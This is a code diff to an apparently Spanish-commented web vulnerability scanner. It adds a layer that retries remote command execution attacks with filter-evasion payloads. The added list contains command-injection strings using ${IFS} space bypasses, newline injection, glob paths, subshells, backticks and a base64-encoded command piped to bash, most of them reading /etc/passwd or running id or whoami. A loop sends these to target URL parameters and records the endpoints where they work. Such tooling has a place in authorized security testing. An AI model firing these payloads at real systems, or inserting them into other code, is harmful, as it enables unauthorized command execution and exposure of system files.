@@ -69,6 +69,63 @@ def is_rce_response(text):
     return any(pat.lower() in lower for pat in rce_output_patterns)
 
 
+# ---------------------------------------------------------------------------
+# BYPASS PAYLOADS PARA RCE
+# Usados cuando el payload inicial no produce output real.
+# Cubren: filtros de espacio (${IFS}), filtros de operadores (newline),
+# filtros de keywords (alternativas a cat/id/ifconfig), encoding.
+# ---------------------------------------------------------------------------
+
+_RCE_BYPASS_PAYLOADS: list = [
+    # Bypass de filtro de espacio con ${IFS}
+    "|${IFS}id",
+    ";${IFS}id",
+    "&&${IFS}id",
+    "|${IFS}cat${IFS}/etc/passwd",
+    ";${IFS}cat${IFS}/etc/passwd",
+    # Newline injection (bypass de filtros de ; y |)
+    "%0aid",
+    "%0acat%20/etc/passwd",
+    "%0awhoami",
+    # Comandos alternativos (si id/cat filtrados)
+    "| whoami",
+    "; whoami",
+    "&& whoami",
+    "| type%20C:\\Windows\\System32\\drivers\\etc\\hosts",
+    # Glob en lugar de path literal (bypass de filtros de path)
+    ";/???/??t${IFS}/etc/passwd",
+    ";/usr/bin/id",
+    # Subshell anidado
+    "|$(id)",
+    ";$(cat${IFS}/etc/passwd)",
+    # Backtick alternativo
+    "`whoami`",
+    "`id`",
+    # Encoding hex del comando
+    "| {echo,aWQ=}|{base64,-d}|bash",
+]
+
+
+def _rce_detect_filter(payload_used: str, response_text: str) -> str:
+    """
+    Intenta detectar qué tipo de filtro bloqueó la ejecución del comando.
+    Retorna: 'space_filter' | 'operator_filter' | 'keyword_filter' | 'unknown'
+    Solo llamar cuando is_rce_response(text) == False pero hay evidencia de
+    que el endpoint procesa comandos (respuesta diferente al baseline).
+    """
+    lower = response_text.lower()
+    # Si el payload tiene pipe/semi pero la respuesta no los refleja → filtro de operadores
+    if ("|" in payload_used or ";" in payload_used) and "|" not in lower and ";" not in lower:
+        return "operator_filter"
+    # Si el espacio del payload fue eliminado
+    if " " in payload_used and payload_used.replace(" ", "") in lower:
+        return "space_filter"
+    # Si hay output parcial (el comando llegó pero fue filtrado)
+    if any(kw in lower for kw in ["permission denied", "command not found", "not recognized"]):
+        return "keyword_filter"
+    return "unknown"
+
+
 def _param_reflects_marker(method: str, url: str, all_params: dict, target_param: str,
                              headers: dict) -> bool:
     """Devuelve True si el parámetro refleja el marcador como valor plano
@@ -172,14 +229,39 @@ def rce(urip, urif, wordlist, urls_vulnerables, threads, custom_headers, random_
                     with lock:
                         if base_url not in vulnerable_endpoints:
                             vuln_manager.mark_as_exploited(base_url, base_url_only=True)
-                            
-                            # Salida sincronizada usando la nueva función
                             with stdout_lock:
                                 encoded = quote(payload, safe='')
                                 print_vulnerability(f"\033[1;32m[GET][VULNERABLE]\033[0m {base_url}?{param}={encoded}")
-                            
                             urls_vulnerables.append(f"{base_url}?{param}={encoded}")
                     break
+
+                # ── BYPASS LAYER: respuesta cambió pero no hubo output real ──
+                # Solo intentar si la respuesta difiere del baseline (endpoint activo)
+                # y aún no está en vulnerable_endpoints
+                elif (r.status_code == 200
+                      and not has_real_output
+                      and r.text.lower() != baseline
+                      and abs(len(r.text) - len(baseline)) > 100
+                      and base_url not in vulnerable_endpoints):
+                    for bp in _RCE_BYPASS_PAYLOADS:
+                        bp_data = {k: bp if k == param else "TEST123" for k in qs}
+                        try:
+                            rb = requests.get(base_url, params=bp_data, headers=headers,
+                                              verify=False, timeout=5)
+                            if rb.status_code == 200 and is_rce_response(rb.text):
+                                with lock:
+                                    if base_url not in vulnerable_endpoints:
+                                        vuln_manager.mark_as_exploited(base_url, base_url_only=True)
+                                        with stdout_lock:
+                                            encoded = quote(bp, safe='')
+                                            print_vulnerability(f"\033[1;32m[GET-BYPASS][VULNERABLE]\033[0m {base_url}?{param}={encoded}")
+                                        entry = f"{base_url}?{param}={encoded}"
+                                        entry += f"|||BYPASS_TECHNIQUE:RCE-BYPASS|||BYPASS_ORIGINAL:{quote(payload, safe='')}"
+                                        urls_vulnerables.append(entry)
+                                break
+                        except Exception:
+                            continue
+
             except requests.exceptions.Timeout:
                 continue
             except requests.exceptions.RequestException:
